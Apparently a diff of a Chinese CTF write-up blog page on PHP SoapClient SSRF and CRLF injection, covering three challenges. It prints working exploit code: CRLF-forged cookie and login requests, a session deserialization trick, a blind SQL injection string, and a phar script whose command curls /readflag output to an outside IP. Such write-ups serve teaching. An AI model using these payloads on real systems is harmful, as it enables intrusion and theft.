@@ -475,7 +475,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </li>
 </ul>
 <h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services<br>这个扩展实现了6个类。其中有三个高级的类： SoapClient、SoapServer 和SoapFault，<br>和三个低级类，它们是 SoapHeader、SoapParam 和 SoapVar。<br>其构造方法如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （mixed $wsdl [，<span class="keyword">array</span> $options ]）</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></pre>
 <p>第一个参数是用来指明是否是wsdl模式。通常我们构造时设为null即可。</p>
 <p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
 <p>这里有趣的地方就在于两点</p>
@@ -485,9 +485,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </ul>
 <p>来依次解释下这两个有趣之处<br>1.原生类说明我们不需要刻意去寻找php POPChain中的利用点。因为Soap已经提供给我们一个现成的魔术方法。而只要用Soap,我们就可以达成ssrf，可以打内网.</p>
 <p>2.User-Agent可自定义带来的是CRLF注入的可能。为什么这么说？因为http header里有一个重要的Content-Type为和Content-Length。<br>而User-Agent的http header位置正好在这些之上，所以可以进行覆盖。对于Content-Type，如果我们想要利用CRLF发送post请求，那么要求它为application/x-www-form-urlencode<br>那么此时就可以利用CRLF，构造如下payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; new SoapClient(null,array(&#39;user_agent&#39;&#x3D;&gt;&quot;test\r\nCookie: PHPSESSID&#x3D;08jl0ttu86a5jgda8cnhjtvq32\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\nContent-Length:45\r\n\r\n</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;nu1ladmin&amp;code&#x3D;470837\r\n\r\n\r\n&quot;,</span><br><span class="line">&#39;location&#39;&#x3D;&gt;$location,</span><br><span class="line">&#39;uri&#39;&#x3D;&gt;$uri));</span><br></pre></td></tr></table></figure>
-
-<p>CRLF与SSRF，这两个漏洞都可以通过SoapClient达成。</p>
+<pre><code>$payload = new SoapClient(null,array(&#39;user_agent&#39;=&gt;&quot;test\r\nCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32\r\n
+Content-Type: application/x-www-form-urlencoded\r\nContent-Length:45\r\n\r\n
+username=admin&amp;password=nu1ladmin&amp;code=470837\r\n\r\n\r\n&quot;,
+&#39;location&#39;=&gt;$location,
+&#39;uri&#39;=&gt;$uri));</code></pre><p>CRLF与SSRF，这两个漏洞都可以通过SoapClient达成。</p>
 <h1 id="真题"><a href="#真题" class="headerlink" title="真题"></a>真题</h1><p>干说道理是不够的，这里直接把几天来做到的真题分析下。</p>
 <p> 踩坑： windows下开启SoapClient:<br>SoapClient用到的是php扩展，需要在php.ini启用三个动态链接库</p>
 <ul>
@@ -498,42 +500,111 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>这里我的ini文本中开始只找到一个未启用的库<code>;extension=php_curl.dll</code>，但是实际上在php的文件夹的ext里应该是可以全部找到的。所以需要把这三个文件名都启用（即去掉开头分号），并令其等于对应的扩展路径，这样就可以使用SoapClient了。</p>
 <p>Linux安装一把梭就好，不必多说。</p>
 <h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>题目源码<br>index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$b = &#39;implode&#39;;
+call_user_func($_GET[&#39;f&#39;], $_POST);
+session_start();
+if (isset($_GET[&#39;name&#39;])) {
+    $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
+}
+var_dump($_SESSION);
+$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
+call_user_func($b, $a);
+?&gt;</code></pre>
 <p>flag.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">session_start();
+echo &#39;only localhost can get flag!&#39;;
+$flag = &#39;LCTF{*************************}&#39;;
+if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){
+       $_SESSION[&#39;flag&#39;] = $flag;
+   }</code></pre>
 <p>题目有几个重点，我们先从结果看起。<br>flag在flag.php中，想要读到flag，必然需要从127.0.0.1访问，然后flag会被保存在session值中。显然是个ssrf了。那么我们看看index.php中的代码<br><code>var_dump($_SESSION);</code><br>首先确认session的值会被打印出来。既然如此，那看来我们的目标就是ssrf了。再来看看其他函数需要怎么利用。<br>很唐突的一个<code>$b = &#39;implode&#39;;</code>+<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>以及最后一个<code>call_user_func($b, $a);</code><br>这里b紧接着一个<code>call_user_func</code>看来是可以变量覆盖了。<br>那么如果覆盖了的话，覆盖成什么，又怎么利用呢？<br>这里需要知道一点：</p>
 <ul>
 <li>call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法</li>
 </ul>
 <p>‘假如我们一开始利用f将b覆盖成 <code>call_user_func()</code>，那么在index.php的最后，函数将执行<br><code>calluserfunc(calluserfunc,array($_session,‘welcome_to_the_lctf2018’))</code><br>由于<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>可控，如果令name=SoapClient，不就成了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</span><br></pre></td></tr></table></figure>
-<p>吗？<br>前面提到，如果SoapClient存在<code>__call()</code>魔术方法，调用不存在的方法将直接触发我们所需要的ssrf.<br>那么整个流程的最后一步可以先行构造：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; <span class="string">"byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n"</span>,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code></pre><p>吗？<br>前面提到，如果SoapClient存在<code>__call()</code>魔术方法，调用不存在的方法将直接触发我们所需要的ssrf.<br>那么整个流程的最后一步可以先行构造：</p>
+<pre><code class="php">&lt;?php
+$target = &quot;http://127.0.0.1/flag.php&quot;;
+$attack = new SoapClient(null,array(&#39;location&#39; =&gt; $target,
+    &#39;user_agent&#39; =&gt; &quot;byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,
+    &#39;uri&#39; =&gt; &quot;123&quot;));
+$payload = urlencode(serialize($attack));
+echo $payload;
+?&gt;</code></pre>
 <p>注意的是，这里还用到了我们上面提到的CRLF漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;user_agent&#39; &#x3D;&gt; &quot;byc\r\nCookie: PHPSESSID&#x3D;g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,</span><br></pre></td></tr></table></figure>
-<p>看，只要\r\n，我们就可以控制访问时的Cookie,这样最后生效的flag也会被保存在我们可控的cookie中</p>
+<pre><code>  &#39;user_agent&#39; =&gt; &quot;byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,</code></pre><p>看，只要\r\n，我们就可以控制访问时的Cookie,这样最后生效的flag也会被保存在我们可控的cookie中</p>
 <p>下面要思考的就是，怎么触发反序列化呢？联系到题目中敏感的session存储，自然可以联想到某个不用<code>unserialize</code>也能触发的反序列化漏洞：phpsession处理器引擎不一致导致的反序列化。<br>那么问题就解决了：我们在最开始就令引擎为<code>php_serialize</code>，并将序列化数据存储到session中。然后在第二次才进行ssrf。此时由于处理器重新变回php，将触发反序列化，从而触发ssrf，将flag存储在可控cookie中。最后换cookie访问即可。<br>poc：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A5......</span><br><span class="line">同时post serizliaze_handler&#x3D;php_serialize</span><br><span class="line">这样执行的就是session_start(&quot;serialize_handler&quot;:&#39;php_serialize&#39;)</span><br><span class="line">我们的数据被成功写入session</span><br><span class="line"></span><br><span class="line">2.f&#x3D;extract&amp;name&#x3D;SoapClient</span><br><span class="line">同时post b&#x3D;calluserfunc</span><br><span class="line">这样执行的就是calluserfunc(calluserfunc,array($_session,‘welcome_to_the_lctf2018’))</span><br></pre></td></tr></table></figure>
-<p>最后换cookie访问index.php就能拿到flag了。</p>
-<h2 id="De1CTF-shellshellshell"><a href="#De1CTF-shellshellshell" class="headerlink" title="De1CTF shellshellshell"></a>De1CTF shellshellshell</h2><p>超级麻烦的一道题……<br>可能是因为我懒得写自动化脚本吧。看到赵师傅的wp直接自动化一把梭羡慕不已。<br>这题其他细节我就不讲了，主要重点讲讲中间利用Soap的部分<br>首先题目在登录进去后有个点，这里<code>signature</code>变量可以构造下时间盲注。因为反引号+正则替换的使用不当，导致了可注的地方，于是可以得到管理员的账号密码。<br>大概是这种形式吧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#96; or sleep(3) ,1)#</span><br></pre></td></tr></table></figure>
+<pre><code>1.f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5......
+同时post serizliaze_handler=php_serialize
+这样执行的就是session_start(&quot;serialize_handler&quot;:&#39;php_serialize&#39;)
+我们的数据被成功写入session
 
-<p>但是尝试登录时却提示需要从本地登进，这就是说要ssrf了。怎么达成呢?<br>因为我环境懒得重开了，借用下其他师傅的图<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>虽然将mood参数转int并addshalshes了，但是后面mood参数在可以注入的signnature参数后面，所以可以通过注入将其直接注释掉，来注入一个我们的恶意序列化对象<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>然后调用了一个getcountry()方法，结合我们之前的需求，正好可以使用SoapClient。只要使用Soap构造一个登陆admin的请求，序列化后插入数据库，这里调用不存在方法时就能直接触发<code>__call()</code>进而触发ssrf。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/index.php?action=login"</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=jaivypassword&amp;code=4153792'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=pu1bnms95shhapubhqoh9vk7h2'</span>,</span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string.<span class="string">'^^'</span>,<span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'0x'</span>.bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+2.f=extract&amp;name=SoapClient
+同时post b=calluserfunc
+这样执行的就是calluserfunc(calluserfunc,array($_session,‘welcome_to_the_lctf2018’))</code></pre><p>最后换cookie访问index.php就能拿到flag了。</p>
+<h2 id="De1CTF-shellshellshell"><a href="#De1CTF-shellshellshell" class="headerlink" title="De1CTF shellshellshell"></a>De1CTF shellshellshell</h2><p>超级麻烦的一道题……<br>可能是因为我懒得写自动化脚本吧。看到赵师傅的wp直接自动化一把梭羡慕不已。<br>这题其他细节我就不讲了，主要重点讲讲中间利用Soap的部分<br>首先题目在登录进去后有个点，这里<code>signature</code>变量可以构造下时间盲注。因为反引号+正则替换的使用不当，导致了可注的地方，于是可以得到管理员的账号密码。<br>大概是这种形式吧</p>
+<pre><code>1` or sleep(3) ,1)# </code></pre><p>但是尝试登录时却提示需要从本地登进，这就是说要ssrf了。怎么达成呢?<br>因为我环境懒得重开了，借用下其他师傅的图<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>虽然将mood参数转int并addshalshes了，但是后面mood参数在可以注入的signnature参数后面，所以可以通过注入将其直接注释掉，来注入一个我们的恶意序列化对象<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>然后调用了一个getcountry()方法，结合我们之前的需求，正好可以使用SoapClient。只要使用Soap构造一个登陆admin的请求，序列化后插入数据库，这里调用不存在方法时就能直接触发<code>__call()</code>进而触发ssrf。</p>
+<pre><code class="php">&lt;?php
+$target = &quot;http://127.0.0.1/index.php?action=login&quot;;
+$post_string = &#39;username=admin&amp;password=jaivypassword&amp;code=4153792&#39;;
+$headers = array(
+    &#39;Cookie: PHPSESSID=pu1bnms95shhapubhqoh9vk7h2&#39;,
+);
+$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;byc^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string.&#39;^^&#39;,&#39;uri&#39;=&gt;&#39;hello&#39;));
+$aaa = serialize($b);
+$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);
+echo &#39;0x&#39;.bin2hex($aaa);
+?&gt;</code></pre>
 <p>稍微解释下要点，我们需要的是ssrf登录admin，那么到时候反序列化触发完了，我们自己登进去，需要的就是一个满足条件的cookie。<br>同时因为要构造的请求必须是登录时包含了admin的账号密码以及验证码的数据，所以需要post请求。这里又一次用到CRLF，来控制Content-Type，Content-Length,达成post请求的条件。</p>
 <p>那么此时最好重开一个浏览器，直接使用新界面的cookie以及算好的验证码放到脚本中，得到16进制的序列化数据。然后在已经登录的位置注入序列化数据。这时会自动跳到index界面，触发序列化。（我直接遇到500,但是不影响）之后再回到原先未登录的地方登录就好了。</p>
 <p>后面的部分不提了，昨天做了我一下午……可以参考赵师傅或者其他师傅的wp<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a><br><a href="https://blog.csdn.net/chasingin/article/details/104687766" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104687766</a></p>
 <h2 id="SUCTF-UploadLabs2"><a href="#SUCTF-UploadLabs2" class="headerlink" title="SUCTF UploadLabs2"></a>SUCTF UploadLabs2</h2><p>这题也是给出源码，然后审计<br>首先是Ad类一个诱人的析构方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">function __destruct(){
+        system($this-&gt;cmd);
+    }</code></pre>
 <p>来看看达成条件<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>需要ssrf，不用说这里应该又可以想到我们的Soap类了。<br>然后看看有没有可用的方法，很快在File类中找到</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">    function __wakeup(){
+        $class = new ReflectionClass($this-&gt;func);
+        $a = $class-&gt;newInstanceArgs($this-&gt;file_name);
+        $a-&gt;check();
+    }</code></pre>
 <p>这里ReflectionClass是php中反射类的意思。所以其实wakeup的前两行就是执行了一个实例化对象的作用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$class &#x3D; new ReflectionClass(&#39;Person&#39;); &#x2F;&#x2F; 建立 Person这个类的反射类  </span><br><span class="line">$instance  &#x3D; $class-&gt;newInstanceArgs($args); &#x2F;&#x2F; 相当于实例化Person 类</span><br></pre></td></tr></table></figure>
-<p>加上那个<code>$a-&gt;check();</code>我们基本确定这里就是用Soap类来构造了。<br>接下来联系func.php中传参实例化File对象的做法，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">      $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">      $file-&gt;getMIME();</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<pre><code>$class = new ReflectionClass(&#39;Person&#39;); // 建立 Person这个类的反射类  
+$instance  = $class-&gt;newInstanceArgs($args); // 相当于实例化Person 类 </code></pre><p>加上那个<code>$a-&gt;check();</code>我们基本确定这里就是用Soap类来构造了。<br>接下来联系func.php中传参实例化File对象的做法，</p>
+<pre><code class="php">  $file_path = $_POST[&#39;url&#39;];
+        $file = new File($file_path);
+        $file-&gt;getMIME();
+        echo &quot;&lt;p&gt;Your file type is &#39;$file&#39; &lt;/p&gt;&quot;;</code></pre>
 <p>不难想到使用phar来触发反序列化，这样我们的File类在实例化后，被触发反序列化，调用<code>__wakeup()</code>，只要func是<code>SoapClient</code>就能进行后续的ssrf，达成任意命令执行了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $func=<span class="string">'SoapClient'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;cmd=curl http://174.1.28.1:8877/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name=[</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                <span class="string">'user_agent'</span>=&gt;str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>,<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string.<span class="string">'^^'</span>)</span><br><span class="line">            ,<span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> File();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">@unlink(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;script language='php'&gt; __HALT_COMPILER(); &lt;/script&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'1.phar'</span>,<span class="string">'1.jpg'</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+class File{
+    public $file_name;
+    public $func=&#39;SoapClient&#39;;
+
+    function __construct(){
+        $target = &quot;http://127.0.0.1/admin.php&quot;;
+        $post_string = &#39;admin=&amp;cmd=curl http://174.1.28.1:8877/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;
+        $headers = [];
+        $this-&gt;file_name=[
+            null,
+            array(&#39;location&#39; =&gt; $target,
+                &#39;user_agent&#39;=&gt;str_replace(&#39;^^&#39;, &quot;\r\n&quot;,&#39;byc^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string.&#39;^^&#39;)
+            ,&#39;uri&#39;=&gt;&#39;hello&#39;)
+        ];
+    }
+}
+$a=new File();
+echo urlencode(serialize($a));
+@unlink(&quot;1.phar&quot;);
